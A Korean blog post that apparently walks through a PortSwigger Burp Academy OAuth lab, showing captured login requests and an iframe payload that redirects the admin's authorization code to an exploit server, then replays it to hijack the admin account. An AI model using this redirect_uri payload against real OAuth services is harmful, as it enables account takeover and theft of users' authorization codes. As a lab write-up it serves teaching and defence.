---
layout: post
title: "Burp Academy-OAuth 세번째 문제: Leaking authorization codes and access tokens"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, OAuth취약점]
toc: true
---

# 개요
- OAuth 2.0 인증에 관련된 취약점이다. 
- Authorization Code가로채기 공격(Authorization Code interception attack) 에 대한 랩이다. 
- 참고로 이 공격에 대한 대책으로 [PKCE]({% post_url 2023-04-20-pkce %})가 있다. 
- 취약점 설명 주소: https://portswigger.net/web-security/oauth
- 문제 주소: https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri
- 난이도: PRACTITIONER (보통)


# 취약점 설명 : Leaking authorization codes and access tokens
- OAuth 서비스측에서 redirect_uri 를 제대로 검증하지 않으면 공격자가 운영하는 사이트로 유저가 리다이렉트될 수도 있다는 것
- 리다이렉트 요청에 인증코드 또는 토큰이 포함되기 때문에 공격자는 이를 사용할 수 있다. 

```
Perhaps the most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. By stealing a valid code or token, the attacker may be able to access the victim's data. Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri.

In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate /callback endpoint (the original redirect_uri) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.

Note that using state or nonce protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

```


# 랩설명: OAuth account hijacking via redirect_uri
- 이 랩은 소셜 미디어 계정(OAuth)을 사용해서 로그인할 수 있는 기능이 있다. 
- exploit서버를 이용해서 관리자 유저의 Authorization Code 를 훔친다. 
- 훔친 코드를 사용해서 관리자로 로그인한 후, Calros 유저를 삭제하면 문제가 풀린다. 

```
This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.

To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete Carlos.

The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.

You can log in with your own social media account using the following credentials: wiener:peter.
```


# 풀이 
## 로그인 과정 관찰 
일단 로그인 과정을 살펴본다. 

소셜미디어계정으로 로그인을 하려고 하면 다음과 같이 Oauth 서비스쪽으로 HTTP요청을 보낸다. redirect_uri를 포함해서 response_type, scope등이 파라메터로 포함되어 있다. 

```http
GET /auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri=https://0aa1005d041fe0468120a26500e8000d.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
Host: oauth-0aa90042046ae0a68166a07502570051.oauth-server.net
Cookie: _session=rdLea0xv0GB0kb2Sh3gLd; _session.legacy=rdLea0xv0GB0kb2Sh3gLd
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

OAuth서비스는 다음과 같이 원래의 랩으로 리다이렉트를 지시하는 응답을 회신한다. URL에 인증코드(`code`파라메터)가 포함되어 있다.

```http
HTTP/2 302 Found
X-Powered-By: Express
Pragma: no-cache
Cache-Control: no-cache, no-store
Location: https://0aa1005d041fe0468120a26500e8000d.web-security-academy.net/oauth-callback?code=Nca6v7Fyp_sHjNt5kIuv4XsYYvKn3hEpShD4ZsExx2f
Content-Type: text/html; charset=utf-8
Set-Cookie: _session=rdLea0xv0GB0kb2Sh3gLd; path=/; expires=Mon, 15 May 2023 00:36:06 GMT; samesite=none; secure; httponly
Set-Cookie: _session.legacy=rdLea0xv0GB0kb2Sh3gLd; path=/; expires=Mon, 15 May 2023 00:36:06 GMT; secure; httponly
Date: Mon, 01 May 2023 00:36:06 GMT
Keep-Alive: timeout=5
Content-Length: 289

Redirecting to <a href="https://0aa1005d041fe0468120a26500e8000d.web-security-academy.net/oauth-callback?code=Nca6v7Fyp_sHjNt5kIuv4XsYYvKn3hEpShD4ZsExx2f">https://0aa1005d041fe0468120a26500e8000d.web-security-academy.net/oauth-callback?code=Nca6v7Fyp_sHjNt5kIuv4XsYYvKn3hEpShD4ZsExx2f</a>.
```

그러면 브라우저는 리다이렉트를 따라서 랩 서버로 요청을 전송한다. 

```http
GET /oauth-callback?code=PwjgaWMgIJ929S3sY3DJSU6nPSc7RE20TSJpYpGOjzX HTTP/2
Host: 0aa1005d041fe0468120a26500e8000d.web-security-academy.net
Cookie: session=uhTedXUzYRfBaLzyohnbS5QIS521aX3f
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://oauth-0aa90042046ae0a68166a07502570051.oauth-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers


```

## 공격 방법 검토 
- 그러면 어떻게 관리자의 Auth 코드를 얻을 수 있을까 생각해보자. 
- redirect_uri를 exploit서버로 변경한 요청을 보내도록 하는 iframe을 쓰면 될 것 같다. 
- 즉 다음과 같다. 

```html
<iframe src="https://{OAuth서버URL}/auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri={exploit서버URL}/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
```
- 관리자가 이 페이지를 열면 OAuth서버에 로그인 요청이 보내지게 될 것이다. (GET /auth?client_id=xxxxx&redirect_uri=xxxx)
- OAuth서버는 code를 발행하여 exploit서버로 리다이렉트 시킬 것이다.  
- exploit서버의 접근로그를 보면 code값을 확인할 수 있을 것이다. (URL에 ocde가 포함되므로)

## explit 서버 구성
다음과 같이 구성하였다. client_id값은 문제 세션마다 상이하다. 적절하게 변경한다. 그리고 Deliver exploit to victim을 클릭한다. 

```html 
<iframe src="https://oauth-0a1a00ec037741f383d50d69023f00bf.oauth-server.net/auth?client_id=bdww3ggebwzoucdafct1n&redirect_uri=https://exploit-0a24008c031941c983d00e8801fd0096.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
```

![exploit 서버](/images/burp-academy-oauth-3-2.png)


## exploit서버 로그에서 code 확인
exloit서버에서 Access log버튼을 눌러서 로그를 확인해본다. 그러면 다음과 같이 code가 포함된 요청이 있었던 것을 볼 수 있다! 관리자의 인증 코드를 얻어내는데 성공했다!

![로그에서 code 확인](/images/burp-academy-oauth-3-3.png)


## 훔친 인증코드를 사용해서 관리자로 로그인
그러면 이제 얻어낸 인증코드를 사용해서 관리자로 로그인해본다. 문제 사이트의 My Account메뉴를 클릭해서 로그인 과정을 개시한다. 이 때 Burp Proxy를 ON으로하고 HTTP요청을 캡처한다. 다음과 같이 문제서버에 OAuth 인증코드를 사용해서 로그인을 하는 부분을 캡쳐해서 code를 위의 과정에서 얻은 관리자 유저의 값으로 변경하고 요청을 보낸다. 

```http
GET /oauth-callback?code=PwjgaWMgIJ929S3sY3DJSU6nPSc7RE20TSJpYpGOjzX HTTP/2
Host: 0aa1005d041fe0468120a26500e8000d.web-security-academy.net
Cookie: session=uhTedXUzYRfBaLzyohnbS5QIS521aX3f
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://oauth-0aa90042046ae0a68166a07502570051.oauth-server.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Te: trailers
```


![관리자 유저로 로그인시도](/images/burp-academy-oauth-3-4.png)

그러면 관리자 유저로 로그인이 성공한 것을 볼 수 있다. 오른쪽 상단에 Admin panel 메뉴가 보인다. 

![관리자 유저 로그인 성공](/images/burp-academy-oauth-3-5.png)

Admin메뉴로 들어가서 Calors 유저를 삭제하면 풀이 성공했다는 메세지가 나타난다. 

![관리자 유저 로그인 성공](/images/burp-academy-oauth-3-success.png)